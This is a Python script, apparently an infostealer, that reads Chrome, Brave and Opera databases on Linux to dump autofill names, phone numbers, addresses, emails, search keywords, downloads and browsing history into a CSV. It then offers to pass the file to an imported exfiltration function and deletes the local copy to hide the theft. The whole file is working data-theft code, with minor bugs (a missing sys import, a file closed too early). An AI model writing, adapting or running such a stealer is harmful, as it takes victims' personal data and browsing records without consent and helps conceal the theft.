from pathlib import Path
from exfiltration import exfiltrate
import sqlite3
import csv
import os

# DB Files
web_data_file = 'Web Data'
history_file = 'History'

web_data = '/home/' + os.getlogin() + f'/.config/google-chrome/Default/{web_data_file}'
history = '/home/' + os.getlogin() + f'/.config/google-chrome/Default/{history_file}'

# Browser Webdata
OPERA_WEBDATA = '/home/' + os.getlogin() + f'/.config/opera/{web_data_file}'
BRAVE_WEBDATA = '/home/' + os.getlogin() + f'/.config/BraveSoftware/Brave-Browser/Default/{web_data_file}'
CHROME_WEBDATA = '/home/' + os.getlogin() + f'/.config/google-chrome/Default/{web_data_file}'

# Browser History
OPERA_HISTORY = '/home/' + os.getlogin() + f'/.config/opera/{history_file}'
BRAVE_HISTORY = '/home/' + os.getlogin() + f'/.config/BraveSoftware/Brave-Browser/Default/{history_file}'
CHROME_HISTORY = '/home/' + os.getlogin() + f'/.config/google-chrome/Default/{history_file}'

# CSV file to output results to
profile = open('profile.csv',mode='a',newline='',encoding='utf-8')
csv_writer = csv.writer(profile, delimiter=',')
csv_writer.writerow(["First Name","Middle Name","Last Name","Full Name","Name","Keyword","URL","Email","Download Path","File Type","Title","Visted","Typed","Phone Number","Company Name","Street Address","City","State","Zipcode","Country Code"])
files = ['profile.csv']

def phone(browser,browser_name):
    print(f"""Dumping {browser_name} Phone Numbers
==============================================================""")
    try:
        conn = sqlite3.connect(browser)
        cursor = conn.cursor()
        data = cursor.execute('SELECT number FROM autofill_profile_phones')

        for number in data:
            csv_writer.writerow(["","","","","","","","","","","","","",''.join(number)])
        print("[All Phone Data Dumped] written data to profile.csv\n")
    except sqlite3.OperationalError:
        print("[Error] {browser_name} Web Data database not Found\n")
        pass
        
def get_names(browser,browser_name):
    print(f"""Dumping {browser_name} names
==============================================================""")
    try:
        conn = sqlite3.connect(browser)
        cursor = conn.cursor()
        data = cursor.execute('SELECT first_name,middle_name,last_name,full_name FROM autofill_profile_names')

        for first_name,middle_name,last_name,full_name in data:
            csv_writer.writerow([first_name,middle_name,last_name,full_name])
        print("[All Names Dumped] written data to profile.csv\n")
    except sqlite3.OperationalError:
        print(f"[Error] {browser_name} Web Data database not Found\n")
        pass

def keywords(browser,browser_name):
    print(f"""Dumping {browser_name} Keywords
==============================================================""")
    try:
        conn = sqlite3.connect(browser)
        cursor = conn.cursor()
        data = cursor.execute('SELECT short_name,keyword,url FROM keywords')

        for name, keyword,url in data:
            csv_writer.writerow(["","","","",name,keyword,url])
        print("[All Keywords Dumped] written data to profile.csv\n")
    except sqlite3.OperationalError:
        print(f"[Error] {browser_name} Web Data database not Found\n")
        pass

def autofill(browser,browser_name):
    print(f"""Dumping {browser_name} Autofill Data
==============================================================""")
    try:
        conn = sqlite3.connect(browser)
        cursor = conn.cursor()
        data = cursor.execute('SELECT name,value FROM autofill')

        for name, email, in data:
            csv_writer.writerow(["","","","","","","","",email])
        print("[All Autofill Info Dumped] written data to profile.csv\n")
    except sqlite3.OperationalError:
        print(f"[Error] {browser_name} Web Data database not Found\n")
        pass
        
def profile_data(browser,browser_name):
    print(f"""Dumping {browser_name} Profile Data
==============================================================""")
    try:
        conn = sqlite3.connect(browser)
        cursor = conn.cursor()
        data = cursor.execute('SELECT company_name,street_address,city,state,zipcode,country_code FROM autofill_profiles')
        
        for company,street,city,state,zipcode,country_code, in data:
            csv_writer.writerow(["","","","","","","","","","","","","","",company,street,city,state,zipcode,country_code])
        print("[All Profile Data Dumped] written data to profile.csv\n")
    except sqlite3.OperationalError:
        print(f"[Error] {browser_name} Web Data database not Found\n")
        pass
    
def downloads(browser,browser_name):
    print(f"""Dumping {browser_name} Download Info
==============================================================""")
    try:
        conn = sqlite3.connect(browser)
        cursor = conn.cursor()
        data = cursor.execute('SELECT target_path,tab_url,original_mime_type FROM downloads')

        for download_path, tab,file_type in data:
            csv_writer.writerow(["","","","","","",tab,"",download_path,file_type])
        print("[All Downloads Dumped] written data to profile.csv\n")
    except sqlite3.OperationalError:
        print(f"[Error] {browser_name} History database not Found\n")
        pass

def get_urls(browser,browser_name):
    print(f"""Dumping {browser_name} URLs
==============================================================""")
    try:
        conn = sqlite3.connect(browser)
        cursor = conn.cursor()
        data = cursor.execute('SELECT url,title,visit_count,typed_count FROM urls')

        for url,title,visit_count,typed_count in data:
            csv_writer.writerow(["","","","","","",url,"","","","",title,str(visit_count),str(typed_count)])
        profile.close()
        print("[All URLs Dumped] written data to profile.csv\n")
        print("[All Personal Info Dumped] written data to profile.csv\n")
    except sqlite3.OperationalError:
        print(f"[Error] {browser_name} History database not Found\n")
        pass
        
phone(CHROME_WEBDATA,"Chrome")
phone(BRAVE_WEBDATA,"Brave")
phone(OPERA_WEBDATA,"Opera")

get_names(CHROME_WEBDATA,"Chrome")
get_names(BRAVE_WEBDATA,"Brave")
get_names(OPERA_WEBDATA,"Opera")

keywords(CHROME_WEBDATA,"Chrome")
keywords(BRAVE_WEBDATA,"Brave")
keywords(OPERA_WEBDATA,"Opera")

autofill(CHROME_WEBDATA,"Chrome")
autofill(BRAVE_WEBDATA,"Brave")
autofill(OPERA_WEBDATA,"Opera")

profile_data(CHROME_WEBDATA,"Chrome")
profile_data(BRAVE_WEBDATA,"Brave")
profile_data(OPERA_WEBDATA,"Opera")

downloads(CHROME_HISTORY,"Chrome")
downloads(BRAVE_HISTORY,"Brave")
downloads(OPERA_HISTORY,"Opera")  

get_urls(CHROME_HISTORY,"Chrome")
get_urls(BRAVE_HISTORY,"Brave")
get_urls(OPERA_HISTORY,"Opera")

def cleanup(input_files):
    print("[*] Deleting files")
    for rm in input_files:
        file_exist = Path(rm)
        if file_exist.is_file():
            os.remove(rm)
            print("[*] " + rm + " Deleted")
        else:
            print("[!] " + rm + " File Not Found")

exfil = input("[?] Do you want to exfiltrate data: Y/N? ")
if exfil.upper() == "N":
    print("[!] Goodbye!")
    sys.exit()

if exfil.upper() == "Y":
    exfiltrate(files)
    cleanup(files)

